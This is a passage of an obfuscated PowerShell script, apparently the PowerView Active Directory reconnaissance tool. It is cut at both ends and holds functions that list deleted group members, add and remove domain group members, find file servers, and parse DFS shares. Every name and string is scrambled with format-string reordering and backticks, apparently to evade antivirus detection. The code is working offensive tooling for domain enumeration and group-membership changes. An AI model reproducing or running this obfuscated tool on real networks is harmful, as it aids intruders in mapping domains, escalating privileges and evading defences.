        if (${PSB`OUNDPA`Ra`mE`TeRS}[("{2}{3}{0}{1}"-f'Fil','ter','LDA','P')]) { ${sEaR`c`He`R`A`RguMentS}[("{0}{1}{2}" -f'L','DAP','Filter')] = ${l`daP`Fil`TER} }
        if (${P`sBOUn`D`pAr`AmeTeRs}[("{0}{3}{2}{1}" -f 'Sea','hBase','c','r')]) { ${SEARcheR`A`RGUM`eN`Ts}[("{0}{2}{1}" -f 'Sea','se','rchBa')] = ${s`eaRC`HbASe} }
        if (${PSbOUnD`PaR`AMete`Rs}[("{0}{1}" -f 'Ser','ver')]) { ${searCHERa`R`G`Um`ENTs}[("{2}{0}{1}"-f 'e','rver','S')] = ${S`eRV`eR} }
        if (${Psb`OUnd`PAR`Ame`TErs}[("{0}{1}{2}{3}" -f'Sear','ch','Sc','ope')]) { ${Se`Ar`Ch`e`Ra`RgumEnts}[("{0}{1}{2}{3}" -f 'Sear','chSc','op','e')] = ${sea`RC`HS`CoPe} }
        if (${P`SB`OUNdp`AramEteRs}[("{4}{3}{0}{1}{2}" -f 'g','eSi','ze','ltPa','Resu')]) { ${s`EaRCHer`ARGU`me`N`Ts}[("{2}{0}{1}{3}" -f 'sultPage','Si','Re','ze')] = ${RESulTPa`gE`S`Ize} }
        if (${ps`BO`UNd`PAramet`ers}[("{0}{2}{1}"-f'Server','Limit','Time')]) { ${SEaRCHeraR`G`UM`e`NTS}[("{4}{2}{3}{0}{1}" -f 'imi','t','verT','imeL','Ser')] = ${SEr`VeRT`I`MELiMIT} }
        if (${p`SBoUN`DpARAM`E`Ters}[("{0}{1}{2}"-f'To','mbston','e')]) { ${sE`ArchE`Ra`RG`UmEn`Ts}[("{2}{1}{0}" -f'stone','mb','To')] = ${Tom`BSt`OnE} }
        if (${psB`oun`DPA`RAmETeRs}[("{0}{1}{2}{3}"-f 'C','rede','nt','ial')]) { ${se`ARche`Rar`gUmen`Ts}[("{1}{2}{0}" -f 'al','Creden','ti')] = ${CR`E`deNti`Al} }
    }

    PROCESS {
        if (${p`sBo`UNdparAMe`T`ErS}[("{1}{2}{0}"-f'ty','Ident','i')]) { ${sEAR`CheRA`RgUm`en`Ts}[("{0}{1}{2}" -f'I','dent','ity')] = ${Id`EnTItY} }

        &("{2}{0}{1}" -f 'oma','inObject','Get-D') @SearcherArguments | &("{0}{2}{3}{1}" -f'Fo','t','rEa','ch-Objec') {
            ${oB`JE`ctDN} = ${_}."prO`p`eRtIES"[("{5}{2}{3}{0}{4}{1}" -f 'edn','e','n','guish','am','disti')][0]
            ForEach(${xML`No`dE} in ${_}."PR`OPE`R`TIes"[("{0}{6}{5}{4}{2}{1}{3}"-f 'm','tada','alueme','ta','plv','re','sds-')]) {
                ${t`EMPO`BjeCT} = [xml]${X`M`lnODE} | &("{1}{0}{3}{2}" -f'elect','S','bject','-O') -ExpandProperty ("{2}{1}{4}{3}{0}"-f '_META_DATA','S_','D','PL_VALUE','RE') -ErrorAction ("{1}{2}{0}{3}"-f 'lyC','Sil','ent','ontinue')
                if (${TEmp`oB`J`eCt}) {
                    if ((${TEmpOb`j`ECT}."psz`AtTri`B`U`TenaME" -Match ("{1}{0}" -f'ember','m')) -and ((${tEm`po`B`jECT}."dwveRSI`on" % 2) -eq 0 )) {
                        ${o`UtP`Ut} = &("{0}{1}{2}" -f'New-','Obje','ct') ("{2}{0}{1}"-f 'ec','t','PSObj')
                        ${oUT`p`Ut} | &("{1}{0}{2}" -f'-','Add','Member') ("{2}{0}{3}{1}"-f 'Prope','y','Note','rt') ("{1}{0}" -f'N','GroupD') ${o`BJeCt`dN}
                        ${o`Ut`PuT} | &("{1}{2}{0}"-f 'mber','Add-M','e') ("{0}{3}{1}{2}"-f 'N','pe','rty','otePro') ("{1}{0}" -f'N','MemberD') ${tEMp`Obje`ct}."pSZ`ObjecT`Dn"
                        ${O`UTPUt} | &("{1}{3}{2}{0}" -f'ber','Add','m','-Me') ("{3}{1}{2}{0}" -f'y','e','Propert','Not') ("{2}{3}{0}{1}" -f'de','d','Ti','meFirstAd') ${T`e`MpOBJECt}."FTIme`CReaT`ed"
                        ${OUT`put} | &("{1}{2}{0}" -f 'Member','Ad','d-') ("{2}{0}{1}" -f'tePrope','rty','No') ("{0}{2}{3}{1}" -f 'T','d','imeDele','te') ${TEm`pOBj`E`CT}."ftImE`D`E`LETeD"
                        ${O`U`TpUT} | &("{1}{0}{2}" -f'dd-Memb','A','er') ("{2}{1}{0}" -f'y','ropert','NoteP') ("{4}{0}{3}{1}{2}{5}"-f 'O','gi','natingChan','ri','Last','ge') ${tEmPob`j`Ect}."F`Ti`MElASt`or`iGi`N`A`TinGCHAnGE"
                        ${ou`TP`UT} | &("{0}{2}{1}"-f'Add-','mber','Me') ("{1}{0}{2}" -f 'e','Not','Property') ("{2}{3}{0}{1}" -f'sAdd','ed','Tim','e') (${T`e`MPOBJE`ct}."D`WVEr`sIOn" / 2)
                        ${OUT`p`Ut} | &("{0}{1}{2}" -f 'Add','-Mem','ber') ("{0}{1}{2}{3}" -f 'N','otePrope','rt','y') ("{2}{3}{4}{0}{1}"-f'gDsa','DN','Last','Origina','tin') ${Te`Mp`OBjE`CT}."pSzlaSTor`Ig`inaTin`G`dsadn"
                        ${oUT`puT}."PSoB`JeCT"."T`Y`PENAmeS".("{1}{0}" -f'sert','In').Invoke(0, ("{4}{7}{5}{2}{1}{0}{3}{6}"-f 'Mem','nGroup','Domai','berDe','Po','iew.','leted','werV'))
                        ${OU`TPuT}
                    }
                }
                else {
                    &("{1}{2}{0}"-f'erbose','W','rite-V') ('['+'Get-D'+'om'+'ainGrou'+'pMemb'+'erDelete'+'d] '+'E'+'rro'+'r '+'retriev'+'i'+'ng'+' '+(('GiW'+'msds-'+'replvalu'+'emeta'+'d'+'a'+'t'+'a'+'GiW ')  -crePlaCe ([ChAr]71+[ChAr]105+[ChAr]87),[ChAr]39)+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}


function a`Dd-`doM`AINgr`oupMe`mbER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{3}{0}{1}"-f'ldP','rocess','SSho','u','P'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POsItiON = 0, ManDatory = ${tR`Ue})]
        [Alias({"{0}{2}{1}"-f'Gr','Name','oup'}, {"{2}{0}{1}" -f 'upIden','tity','Gro'})]
        [String]
        ${iD`eN`TITY},

        [Parameter(mandAtory = ${TR`UE}, VAluefroMPipElinE = ${t`RUe}, valuEFRoMpiPeLINEBYproPertYNaME = ${tR`Ue})]
        [Alias({"{4}{1}{2}{0}{3}"-f 'de','mb','erI','ntity','Me'}, {"{1}{0}" -f'ber','Mem'}, {"{3}{2}{1}{0}"-f 'ishedName','u','ing','Dist'})]
        [String[]]
        ${me`M`BERS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oM`AIN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`eD`e`NtIAL} =  ( &("{3}{0}{1}{2}"-f'B','L','E','GEt-varIa')  ("{1}{0}"-f '3xo6','Jh')  -VALueo )::"EM`ptY"
    )

    BEGIN {
        ${coNt`EXTAR`G`UMeNts} = @{
            ("{2}{1}{0}" -f'entity','d','I') = ${IDENtI`TY}
        }
        if (${pS`BouNDparam`et`ers}[("{0}{1}{2}"-f'Do','ma','in')]) { ${C`onteXtArg`UMe`NTS}[("{2}{1}{0}" -f 'ain','om','D')] = ${D`OMaIn} }
        if (${PSBouNd`pAr`AmeTE`RS}[("{3}{1}{2}{0}" -f'al','ede','nti','Cr')]) { ${CoNtEx`TaR`G`U`mENTs}[("{2}{1}{0}" -f'l','a','Credenti')] = ${CRed`ENT`IAl} }

        ${GrOU`PCoNTe`xt} = &("{3}{2}{0}{1}"-f 'p','alContext','i','Get-Princ') @ContextArguments

        if (${Gro`UPco`Nt`Ext}) {
            try {
                ${GRo`UP} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{0}{2}{1}"-f'FindBy','dentity','I').Invoke(${GroUPc`o`N`Te`xT}."co`Nte`xT", ${gROU`PC`On`TeXT}."Iden`TI`TY")
            }
            catch {
                &("{2}{0}{1}" -f 'ri','te-Warning','W') ('[Ad'+'d'+'-Dom'+'ai'+'nGroupMemb'+'e'+'r] '+'Erro'+'r '+'f'+'in'+'ding '+'th'+'e '+'grou'+'p '+'identi'+'t'+'y '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${GRO`UP}) {
            ForEach (${M`Emb`eR} in ${memb`e`Rs}) {
                if (${M`e`Mber} -match (('.+0tP0tP.+').("{0}{1}{2}" -f'Repl','Ac','E').Invoke('0tP','\'))) {
                    ${ConteXT`ArG`UM`en`TS}[("{0}{2}{1}" -f'Iden','y','tit')] = ${M`eM`BEr}
                    ${uS`ER`cOnt`exT} = &("{4}{2}{0}{1}{3}{5}"-f 'ri','n','t-P','cipalC','Ge','ontext') @ContextArguments
                    if (${USE`Rc`O`NteXt}) {
                        ${USe`R`I`d`eNTiTY} = ${U`serCONt`E`Xt}."IDenTi`Ty"
                    }
                }
                else {
                    ${UsER`COnT`EXt} = ${GRouP`cOn`T`e`xT}
                    ${uSE`Ride`NTITY} = ${M`e`mBer}
                }
                &("{1}{2}{3}{0}"-f 'se','Write-Ver','b','o') ('['+'Ad'+'d-DomainG'+'ro'+'upMember] '+'Adding'+' '+'member'+' '+"'$Member' "+'to'+' '+'grou'+'p '+"'$Identity'")
                ${m`EmB`er} = [System.DirectoryServices.AccountManagement.Principal]::("{0}{4}{3}{1}{2}"-f'F','entit','y','d','indByI').Invoke(${U`SERco`NtE`Xt}."cO`Nte`Xt", ${us`eRIdeNt`ITY})
                ${gr`OuP}."Me`mBe`Rs".("{0}{1}" -f'Ad','d').Invoke(${MEMB`Er})
                ${G`RouP}.("{1}{0}"-f'e','Sav').Invoke()
            }
        }
    }
}


function rEMo`VE`-domA`INgRoupmE`M`BEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{4}{3}" -f 'ldP','PSShou','r','ss','oce'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(pOsition = 0, mAnDAtoRY = ${t`Rue})]
        [Alias({"{0}{2}{1}" -f'G','upName','ro'}, {"{4}{3}{1}{0}{2}" -f 'nti','e','ty','upId','Gro'})]
        [String]
        ${I`DE`NTItY},

        [Parameter(manDATORy = ${t`RUE}, ValuEFRoMpiPELine = ${Tr`UE}, vALuEfRoMPipEliNEBYproPERTynaMe = ${T`RuE})]
        [Alias({"{2}{3}{0}{1}"-f 'mberIden','tity','M','e'}, {"{1}{0}"-f 'r','Membe'}, {"{3}{1}{2}{0}"-f 'me','stinguis','hedNa','Di'})]
        [String[]]
        ${MEM`B`ErS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`MA`iN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`deN`T`IaL} =   (  &("{1}{3}{2}{4}{0}"-f'EM','G','T-cHI','e','LdiT')  ('var'+'i'+'aBle'+':jH'+'3xO6'))."val`Ue"::"Em`PTy"
    )

    BEGIN {
        ${coN`Tex`TA`Rgum`EN`Ts} = @{
            ("{2}{0}{1}" -f'tit','y','Iden') = ${IDEN`TI`Ty}
        }
        if (${psbOU`N`dpa`R`AmET`erS}[("{1}{0}"-f 'in','Doma')]) { ${coNt`e`xtA`RGUmENtS}[("{1}{0}"-f'n','Domai')] = ${do`M`Ain} }
        if (${PSBound`pAR`AmE`TErS}[("{1}{0}{2}" -f'dent','Cre','ial')]) { ${cont`e`x`TArGumE`N`TS}[("{2}{3}{0}{1}" -f 'de','ntial','Cr','e')] = ${c`RE`DeN`TIAL} }

        ${GRo`UPCoNte`xt} = &("{1}{2}{4}{0}{3}" -f 'alCo','Get-Prin','ci','ntext','p') @ContextArguments

        if (${GrO`UPcOnt`exT}) {
            try {
                ${gRO`UP} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{1}{0}{3}{2}{4}" -f 'yId','FindB','t','enti','y').Invoke(${GRoUp`c`Ont`EXT}."c`o`NtEXt", ${gRoup`CoN`Te`xT}."iDEn`Tity")
            }
            catch {
                &("{2}{1}{0}{3}" -f 'i','rn','Write-Wa','ng') ('[Remove-'+'Dom'+'ain'+'GroupMemb'+'er'+'] '+'Er'+'ror '+'fin'+'di'+'ng '+'the'+' '+'group'+' '+'i'+'den'+'tity '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${Gr`o`Up}) {
            ForEach (${m`eMBer} in ${m`emB`eRs}) {
                if (${m`eMBer} -match ((("{0}{1}" -f '.','+{0}{0}.+'))-f [chAR]92)) {
                    ${co`N`TextArGUMe`NTS}[("{1}{0}" -f'dentity','I')] = ${mE`mB`eR}
                    ${Use`RCO`N`TEXt} = &("{1}{4}{0}{5}{2}{3}" -f'-Princi','Ge','Con','text','t','pal') @ContextArguments
                    if (${u`SeR`CoNT`eXT}) {
                        ${UsE`RId`entI`TY} = ${usE`RC`OnTE`Xt}."id`ENTIty"
                    }
                }
                else {
                    ${usER`Co`N`TExT} = ${grouP`C`oNteXt}
                    ${usEr`ID`eNtI`Ty} = ${M`emBeR}
                }
                &("{2}{0}{1}{3}{4}"-f 'te-','Ve','Wri','r','bose') ('[R'+'e'+'m'+'ove'+'-Do'+'mainGroupMember] '+'Remo'+'v'+'i'+'ng '+'m'+'ember '+"'$Member' "+'from'+' '+'gro'+'u'+'p '+"'$Identity'")
                ${mE`Mb`er} = [System.DirectoryServices.AccountManagement.Principal]::("{0}{1}{2}"-f 'FindByIde','ntit','y').Invoke(${u`seR`Co`NTEXT}."CON`TE`xt", ${u`sEr`idENtItY})
                ${gr`OUP}."mEM`BERs".("{1}{0}{2}" -f 'v','Remo','e').Invoke(${mem`B`er})
                ${G`RoUP}.("{1}{0}" -f 'e','Sav').Invoke()
            }
        }
    }
}


function GET-doM`A`InfIleser`VEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}{4}" -f 'ro','ce','PSShoul','dP','ss'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( VAlUeFrOmPIPeliNe = ${t`RUE}, vaLuEfRompIPElInEByPROPertYNAme = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'mainName','o','D'}, {"{1}{0}" -f'me','Na'})]
        [String[]]
        ${d`Om`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'F','ilter'})]
        [String]
        ${Ldapf`Il`Ter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'A','SPath','D'})]
        [String]
        ${s`Ea`RCHbAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{4}{3}{2}{0}"-f 'er','Do','oll','tr','mainCon'})]
        [String]
        ${sER`V`ER},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{2}{0}"-f'Level','O','ne'}, {"{0}{2}{1}"-f 'S','ee','ubtr'})]
        [String]
        ${S`E`ARCHSc`oPe} = ("{2}{1}{0}" -f'e','tre','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`sUlT`Pag`E`siZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SER`VERTIm`El`ImIT},

        [Switch]
        ${t`Om`Bst`oNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`e`dENtIal} =  ( &("{2}{0}{1}" -f'hILd','ItEM','C')  ("{4}{1}{3}{2}{0}" -f 'o6','BlE','H3x',':J','VArIa')  )."v`ALUe"::"EM`Pty"
    )

    BEGIN {
        function S`Plit-p`Ath {
            
            Param([String]${P`ATh})

            if (${P`ATh} -and (${pa`TH}.("{0}{1}" -f 'spli','t').Invoke('\\')."c`OunT" -ge 3)) {
                ${t`eMp} = ${p`AtH}.("{0}{1}" -f's','plit').Invoke('\\')[2]
                if (${TE`MP} -and (${te`mP} -ne '')) {
                    ${T`Emp}
                }
            }
        }

        ${sEaRCHeRar`Gu`M`EnTS} = @{
            ("{0}{2}{1}"-f'LDAPFi','ter','l') = (((("{25}{24}{21}{18}{10}{22}{14}{27}{8}{2}{20}{6}{9}{19}{15}{28}{13}{7}{17}{3}{16}{11}{26}{0}{12}{1}{4}{23}{5}"-f '=*)(profile','t',')(','d','h',')))','ccountCo','(iac(hom','8','n','e=80','ory=*)(','pa','))','3','3556.1','irect','e','ccountTyp','trol:1.2.840.11','!(userA','amA','5','=*','&(s','(','scriptpath','0636','.4.803:=2')) -crEPLAce  ([CHAR]105+[CHAR]97+[CHAR]99),[CHAR]124))
            ("{2}{0}{1}" -f 'e','s','Properti') = ("{5}{7}{2}{0}{1}{3}{4}{6}"-f 'ptp','ath,',',scri','profi','lepa','homedi','th','rectory')
        }
        if (${PSBou`N`dpAR`A`ME`TErS}[("{0}{1}{2}"-f'Search','Ba','se')]) { ${SeArchErAR`GuM`EN`TS}[("{2}{1}{0}"-f'Base','h','Searc')] = ${s`eARC`hBA`se} }
        if (${p`SbOuN`dpaR`AmETe`Rs}[("{2}{0}{1}"-f 'e','r','Serv')]) { ${Sea`RChERArGuM`eN`TS}[("{1}{0}" -f 'ver','Ser')] = ${sE`RV`ER} }
        if (${ps`BOun`DPAr`AM`Et`Ers}[("{1}{3}{0}{2}" -f 'Sc','Se','ope','arch')]) { ${se`ARC`HERARguMe`Nts}[("{3}{0}{2}{1}"-f 'e','cope','archS','S')] = ${seArc`HS`coPe} }
        if (${Ps`BoU`NDpArA`m`etErS}[("{0}{2}{1}{4}{3}"-f 'R','a','esultP','e','geSiz')]) { ${sEARC`He`RaRg`UMENtS}[("{4}{1}{2}{0}{3}" -f 'z','l','tPageSi','e','Resu')] = ${ReSuLt`pag`E`SizE} }
        if (${ps`B`O`UND`pA`RametERs}[("{2}{3}{0}{1}" -f 'ime','Limit','Serv','erT')]) { ${se`Ar`CheRa`RgumeNtS}[("{2}{1}{3}{4}{0}" -f 'mit','ve','Ser','rT','imeLi')] = ${sErV`e`RTi`melIMIt} }
        if (${PS`BO`U`N`dPa`RAMeTERS}[("{0}{1}" -f 'To','mbstone')]) { ${sEARCHE`Ra`RguMe`NTs}[("{2}{0}{1}" -f 'n','e','Tombsto')] = ${toMB`S`T`One} }
        if (${ps`BO`U`NDp`Ar`AMEteRS}[("{1}{0}{2}" -f'den','Cre','tial')]) { ${sea`R`CHeRArG`UMEN`TS}[("{2}{1}{0}{3}"-f'en','red','C','tial')] = ${c`RE`dentIal} }
    }

    PROCESS {
        if (${P`s`BOUND`PAra`m`ETeRS}[("{1}{0}"-f'n','Domai')]) {
            ForEach (${TargE`TDOMA`IN} in ${DO`ma`IN}) {
                ${SeA`RcHER`ARgumE`NtS}[("{1}{0}"-f 'omain','D')] = ${TAR`GE`TdOM`AiN}
                ${UsER`s`eARcH`Er} = &("{2}{1}{3}{0}" -f'cher','Domai','Get-','nSear') @SearcherArguments
                
                $(ForEach(${u`se`RREsULT} in ${use`RSEar`cH`eR}.("{1}{0}"-f'll','FindA').Invoke()) {if (${U`sErRES`UlT}."P`ROP`eRt`ieS"[("{2}{1}{0}"-f 'ectory','dir','home')]) {&("{1}{0}{2}"-f 'it-','Spl','Path')(${uSerR`e`SU`LT}."PR`OpEr`TIEs"[("{0}{1}{2}"-f 'h','omedirec','tory')])}if (${us`eRre`sU`lT}."Pr`o`PErTies"[("{2}{1}{0}" -f 'h','tpat','scrip')]) {&("{0}{1}{2}"-f'Split-','Pa','th')(${Us`Er`RESuLT}."Prope`Rti`es"[("{0}{3}{2}{1}"-f 's','h','riptpat','c')])}if (${Userr`es`Ult}."p`RO`PERt`Ies"[("{2}{1}{3}{0}"-f 'ath','of','pr','ilep')]) {&("{0}{1}{2}" -f 'Spl','it','-Path')(${U`s`ERrEs`ULT}."p`Rope`RtiES"[("{2}{1}{0}"-f'th','rofilepa','p')])}}) | &("{2}{1}{0}"-f't','bjec','Sort-O') -Unique
            }
        }
        else {
            ${U`seRsEA`RCH`eR} = &("{1}{0}{3}{2}"-f't-Domain','Ge','er','Search') @SearcherArguments
            $(ForEach(${u`se`RreS`Ult} in ${uSE`RseaRCH`ER}.("{0}{1}" -f 'FindA','ll').Invoke()) {if (${UsEr`R`ESU`LT}."Pr`opER`TIes"[("{3}{1}{0}{2}"-f'irector','med','y','ho')]) {&("{1}{0}{2}"-f 'at','Split-P','h')(${U`SerR`esuLt}."p`RoP`ErT`ies"[("{1}{0}{3}{2}" -f 'ec','homedir','y','tor')])}if (${uS`er`ReS`UlT}."p`RO`pERTiES"[("{1}{0}{2}"-f'pt','scri','path')]) {&("{1}{2}{0}"-f 't-Path','Sp','li')(${use`RR`Esult}."P`ROpe`RtI`eS"[("{1}{2}{0}"-f 'ptpath','s','cri')])}if (${userre`sU`LT}."P`RO`peRties"[("{2}{0}{3}{1}" -f'fi','th','pro','lepa')]) {&("{2}{0}{1}"-f'p','lit-Path','S')(${uSer`REs`ULT}."pR`oPe`R`TiEs"[("{1}{3}{2}{0}"-f'th','pr','filepa','o')])}}) | &("{0}{2}{3}{1}"-f 'Sort-Ob','ct','j','e') -Unique
        }
    }
}


function ge`T`-D`o`mAiNDfsshA`RE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}{4}{3}" -f 'PSSh','o','u','cess','ldPro'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{5}{0}{8}{2}{1}{6}{3}{4}" -f'rsM','anA','Th','signm','ents','eDeclaredVa','s','PSUs','ore'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{1}{0}{2}{3}" -f'pprovedVer','A','b','s','PSUse'}, '')]
    [OutputType({"{1}{6}{7}{8}{4}{5}{2}{3}{0}"-f 'tomObject','System.Manageme','on.P','SCus','a','ti','nt.','Auto','m'})]
    [CmdletBinding()]
    Param(
        [Parameter( vAlUEFRoMpIPeliNE = ${t`Rue}, vaLUEfRomPiPelINEbyprOpErTYnaMe = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'Doma','Name','in'}, {"{0}{1}"-f'Na','me'})]
        [String[]]
        ${D`o`mAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'Path','S','AD'})]
        [String]
        ${S`E`A`RChBAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{0}"-f'r','trolle','inCon','Doma'})]
        [String]
        ${S`eRVeR},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{1}{0}{2}" -f'Leve','One','l'}, {"{0}{1}" -f 'Subtre','e'})]
        [String]
        ${Sea`RCHsCo`pE} = ("{1}{0}{2}"-f 'tre','Sub','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`sULTpAg`E`sizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`ER`VeRtimelimIT},

        [Switch]
        ${T`om`BsTOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`dE`Nt`iAl} =   ${j`h3xo6}::"Em`PtY",

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        ${ve`R`Sion} = 'All'
    )

    BEGIN {
        ${se`ARC`H`era`RguM`EntS} = @{}
        if (${p`sBOu`Nd`Par`Amet`Ers}[("{0}{2}{1}"-f 'Searc','e','hBas')]) { ${sear`ch`eRaRGuMen`Ts}[("{0}{2}{1}" -f'Searc','ase','hB')] = ${Sea`Rch`Ba`Se} }
        if (${p`sBO`UnDPAram`eteRS}[("{1}{0}" -f'erver','S')]) { ${SeA`RC`He`RARgu`mEn`Ts}[("{1}{0}" -f 'r','Serve')] = ${S`eR`VEr} }
        if (${psB`oUn`DP`ARam`E`TErS}[("{2}{3}{1}{0}"-f'pe','Sco','Sear','ch')]) { ${SEARCher`ARG`Um`enTS}[("{1}{2}{0}{3}"-f 'ch','Sea','r','Scope')] = ${se`Ar`chScope} }
        if (${pSBOU`NdP`ARAm`eTERs}[("{0}{1}{3}{2}"-f'ResultPag','eS','ze','i')]) { ${Sea`RCHeR`ArGuM`EntS}[("{3}{1}{2}{0}"-f 'ze','tP','ageSi','Resul')] = ${R`EsuL`T`PAgesIzE} }
        if (${pS`BOU`NdPaR`AMe`Ters}[("{2}{3}{0}{1}" -f 'erTimeLi','mit','Ser','v')]) { ${SeA`RChE`Rar`gU`mE`NTs}[("{3}{1}{0}{2}{4}"-f 'erTimeLim','rv','i','Se','t')] = ${SeR`VEr`TiMeLI`M`It} }
        if (${psB`o`U`NdPaR`AMeterS}[("{2}{0}{1}" -f'om','bstone','T')]) { ${s`eA`RChE`RARGum`En`TS}[("{1}{0}{2}" -f'omb','T','stone')] = ${t`oMbs`T`One} }
        if (${pS`Bou`NdPAR`A`METe`Rs}[("{1}{0}{3}{2}" -f 'redent','C','al','i')]) { ${Sea`RcH`eR`ARGUM`E`Nts}[("{0}{1}{2}" -f 'C','redentia','l')] = ${cr`EDeNTI`AL} }

        function pARse-`P`kT {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${P`kT}
            )

            ${b`in} = ${p`kT}
            ${BLob_`VeR`SI`on} =  ( &("{1}{0}" -f 'Tem','i')  ("{2}{3}{0}{1}"-f'ABLE:D','9ef','V','aRI'))."Va`lUE"::"TO`UiNT32"(${b`iN}[0..3],0)
            ${b`loB_elEm`enT`_coUnt} =   ( &("{2}{1}{0}{3}"-f 'ARiaB','t-V','gE','Le')  ('d9'+'EF')  )."v`ALUE"::"toUiN`T32"(${b`iN}[4..7],0)
            ${O`Ffs`ET} = 8
            
            ${O`BjeCT`_lIst} = @()
            for(${I}=1; ${i} -le ${BlOb_eL`EME`N`T_C`OuNt}; ${i}++){
                ${blob`_n`AME`_sI`Ze_staRT} = ${oF`F`seT}
                ${B`lob`_N`AmE`_Si`ze_EnD} = ${o`FFs`et} + 1
                ${BL`Ob`_naM`E_Si`ze} =  ( &("{2}{1}{0}{3}" -f'IABl','VaR','GeT-','e') ("{0}{1}"-f'd9E','f') )."VA`Lue"::"t`OUinT16"(${b`iN}[${BlOb_`NAMe_`Si`Ze_`Sta`RT}..${bL`ob_nA`me`_SIzE_eNd}],0)

                ${Bl`OB_n`A`mE_stArT} = ${b`LOb_nAME`_siZ`E_End} + 1
                ${bL`OB_naMe_e`Nd} = ${bl`ob_n`AM`E_StART} + ${b`lOb_n`AMe`_`SIZe} - 1
                ${bl`OB_na`ME} =  ${k8`6r}::"un`iCO`de"."GEts`Tri`NG"(${B`In}[${BL`Ob`_N`AMe_STARt}..${bl`oB_N`Ame`_e`Nd}])

                ${Blob_DATA`_S`I`ZE_stArt} = ${bL`oB_`Na`Me_EnD} + 1
                ${BLoB`_`daTA_si`z`e_E`Nd} = ${Blob_`D`AT`A_sIZ`E_STaRt} + 3
                ${BL`o`B`_DaT`A_sIze} =   (  &("{2}{1}{0}" -f 'LE','ariaB','V')  ("{0}{1}"-f'D','9EF') -vALUEon)::"to`U`int32"(${b`iN}[${BLO`B`_d`A`Ta`_sI`Ze_staRT}..${bLO`B_`da`Ta_SIZ`E`_ENd}],0)

                ${bloB_dat`A`_sTArT} = ${bl`ob_data_s`izE`_End} + 1
                ${bL`OB`_da`TA`_enD} = ${BL`oB_d`Ata_sta`RT} + ${bl`o`B_D`ATA_siZE} - 1
                ${B`L`ob_DaTa} = ${B`in}[${bLo`B_dAta_`sT`ArT}..${Blob`_d`ATa_E`Nd}]
                switch -wildcard (${bLO`B`_NAMe}) {
                    ((("{3}{0}{1}{2}" -f '}site','r','oot','{0'))-f [cHaR]92) {  }
                    ((("{0}{1}{2}" -f'{0}do','mainro','ot*'))  -F[cHaR]92) {
                        
                        
                        ${r`Oot_oR_`LI`N`K`_GuID_stARt} = 0
                        ${rOOt`_O`R_linK`_gUI`d_end} = 15
                        ${ro`ot_OR_`link_GU`ID} = [byte[]]${BLo`B_dA`TA}[${r`oo`T_or_`lINk_gu`iD`_s`TART}..${rOOt`_O`R_`L`INK_GuiD_`eND}]
                        ${GU`Id} = &("{2}{0}{1}" -f'-','Object','New') ("{1}{0}"-f'd','Gui')(,${ROoT`_Or_liN`k_g`UiD}) 
                        ${pRe`F`I`x_SiZe_ST`ART} = ${ro`oT_`Or_L`i`Nk_G`UiD_e`Nd} + 1
                        ${pREFIx_si`z`E`_enD} = ${pRE`Fix`_siz`e`_START} + 1
                        ${Pr`eF`Ix_s`ize} =   ( &('LS')  ("{0}{2}{1}"-f'vArIa','LE:D9eF','b') )."VA`lUE"::"Tou`i`NT16"(${BlO`B`_DaTA}[${pre`F`i`x_siz`e_StA`Rt}..${PrEf`i`X_sizE_`end}],0)
                        ${pReF`IX_s`Ta`RT} = ${pr`eFI`x`_`sIzE_eND} + 1
                        ${PREfI`x_e`Nd} = ${PrefIX_`STA`RT} + ${p`REf`IX_SIze} - 1
                        ${pREF`iX} =  ( &("{0}{1}"-f'IT','Em')  ('vA'+'Ri'+'A'+'ble:k86r'))."VA`lUe"::"UNIcO`De"."Ge`TsT`RING"(${blob_D`A`TA}[${pRe`FiX_S`T`A`RT}..${p`R`EfiX_ENd}])

                        ${sHORT_`P`REfiX_sIz`E_St`ART} = ${P`R`E`FIX_eND} + 1
                        ${shOrt_`pre`FIX_`s`izE_eNd} = ${ShoRt_`P`Re`F`Ix_sIzE_StArt} + 1
                        ${SH`ORT_`p`R`EfIx`_SiZE} =  ${D`9ef}::"t`ouiN`T16"(${Bl`Ob`_DaTA}[${shor`T_PrefI`X_s`I`z`e_S`Tart}..${SH`orT`_p`R`Ef`Ix_S`iZE_enD}],0)
